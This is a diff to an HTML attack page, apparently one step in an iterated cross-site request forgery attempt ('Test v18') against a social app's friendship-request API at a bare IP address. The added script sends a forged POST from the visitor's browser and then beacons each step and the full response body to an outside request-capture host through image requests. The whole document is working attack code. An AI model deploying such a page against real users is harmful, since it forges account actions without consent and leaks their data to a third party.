@@ -2,6 +2,14 @@
 <html>
 <body>
     <script>
+        const ENDPOINT = 'https://www.postb.in/1766194528609-0921682694461';
+        
+        function log(step, data) {
+            new Image().src = ENDPOINT + '?step=' + encodeURIComponent(step) + '&data=' + encodeURIComponent(data);
+        }
+        
+        log('START', 'Sending friendship request');
+        
         // Простой запрос дружбы с сообщением "123"
         fetch('http://158.160.184.159:13002/api/friendship/request', {
             method: 'POST',
@@ -15,16 +23,18 @@
             })
         })
         .then(response => {
-            console.log('Status:', response.status);
+            log('RESPONSE_STATUS', response.status);
+            log('RESPONSE_OK', response.ok);
             return response.text();
         })
         .then(text => {
-            console.log('Response:', text);
+            log('RESPONSE_BODY', text);
+            log('SUCCESS', 'Friendship request sent! ');
         })
         .catch(error => {
-            console.log('Error:', error);
+            log('ERROR', error.toString());
         });
     </script>
-    <p>Sending friendship request... </p>
+    <p>Test v18</p>
 </body>
 </html>
